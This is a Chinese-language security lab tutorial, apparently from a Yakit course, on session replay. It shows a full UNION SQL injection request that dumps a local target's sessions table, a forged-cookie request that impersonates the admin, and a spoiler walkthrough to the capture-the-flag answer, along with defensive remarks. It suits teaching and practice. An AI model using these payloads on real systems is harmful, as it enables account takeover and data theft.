---
title: 会话重放：拖出预置会话冒充管理员
difficulty: practitioner
---

# 会话重放：拖出预置会话冒充管理员

## 原理背景

HTTP 无状态，服务端靠**会话凭证**认人：Cookie 里带一个随机会话 ID，服务端拿它去 sessions 表查"这是谁"。这套机制的安全性完全取决于两点——会话 ID 是否不可猜、是否不泄露。

本课的靶场犯了第二个错：数据库里**预置了一条 admin 会话**（uuid 是一个固定值），而它恰好能被你在上一专题学会的 UNION 注入拖出来。拿到 uuid，带上对应 Cookie 访问受保护接口，你就是 admin——没有登录、没有密码，只有"凭证重放"。

## Yakit 操作步骤

这是一条**组合技**链路，每一步都换一个 Yakit 视角：

1. **Web Fuzzer**：对 `/user/id` 复用 UNION 注入，目标表换成 `sessions`（列数与 `vulin_users` 同为 9 列，多出的列用字面量占位对齐）；
2. **Web Fuzzer**：构造 `GET /logic/user/profile?id=1`，在请求头里加一行 `Cookie: _cookie=<拖到的 uuid>`，重放；
3. **History 流量审计**：对比"带伪造 Cookie 的请求"与"普通请求"——MITM 历史把所有流量落库可检索，这是复盘攻击链的取证视角。

## 开始实战

点击 **前往配套题目练习**，启动环境后：

1. 用 UNION 注入从 `sessions` 表读出预置会话的 uuid（表含 uuid、username、role 及时间戳等共 9 列）；
2. 带着 `Cookie: _cookie=<uuid>` 请求 `/logic/user/profile?id=1`，响应正常渲染 admin 资料即会话可用；
3. 会话验证可用后，读取靶机 flag 并提交（`GET /flag` 端点在攻击成功后会自动解锁），完成本题。

反思：会话凭证一旦可被读出（注入、日志泄露、XSS 窃取），"改密码"都救不了它——服务端要做的是**销毁旧会话 + 签发新 ID**，以及从源头堵住拖库的注入。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：UNION 拖库 sessions 表**

上一课已知 `/user/id` 是 9 列注入点（`vulin_users` 的列序）。sessions 表同样按 9 列对齐：前 4 列对应 id/created_at/updated_at/deleted_at，接着是 uuid、username、role，剩下两列用字面量 `'a'`、`'b'` 占位（编码版可直接照抄）：

```http
GET /user/id?id=-1%20UNION%20SELECT%20id,created_at,updated_at,deleted_at,uuid,username,role,%27a%27,%27b%27%20FROM%20sessions HTTP/1.1
Host: 127.0.0.1:36870
```

> 若列数没对齐会得到 `SELECTs to the left and right of UNION do not have the same number of result columns`——按报错提示加减占位列即可。

响应 JSON（UNION 的列按 `vulin_users` 的字段名渲染，uuid 落在 `username` 位置）：

```json
[{"id":1,"password":"admin","username":"fixedSessionID","age":"admin","role":"a","remake":"b",...}]
```

预置会话的 uuid 是 **`fixedSessionID`**（username=admin、role=admin）。

**第 3 步：带伪造 Cookie 重放资料接口**

```http
GET /logic/user/profile?id=1 HTTP/1.1
Host: 127.0.0.1:36870
Cookie: _cookie=fixedSessionID
```

（Cookie 名就是 `_cookie`，值是第 2 步拖到的 uuid。）响应正常渲染出 **User Profile** 页面，显示 id=1 用户 admin 的资料——会话冒充成功。对照：不带 Cookie 发同一请求，只会得到 `alert("请先登录")` 的跳转脚本。

**第 4 步：读取本实例 flag**

靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`）。读取端点 `GET /flag` 带门禁：上面的攻击动作成功前直接访问会得到 403（零攻击拿不到 flag）；攻击成功后端点自动解锁，直接请求靶机根路径即可：

```http
GET /flag HTTP/1.1
Host: 127.0.0.1:36870
```

响应就是 flag 原文（一行，`flag{lab-...}`）。

**第 5 步：提交答案**

回到题目详情页，在答案框输入刚读到的 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：越权测试面

会话之外还有一整类**越权**问题：水平越权（改 `id` 看别人资料）、垂直越权（普通用户调管理接口）。测试套路与本课同源——把请求里的身份字段（Cookie/用户 ID/角色）逐个改掉重放，观察服务端是否校验。Web Fuzzer 的多包联动可以把"正常请求 + 篡改请求"成对固化，一次执行看对照。

下一课：JWT 令牌——另一种凭证，另一种伪造。
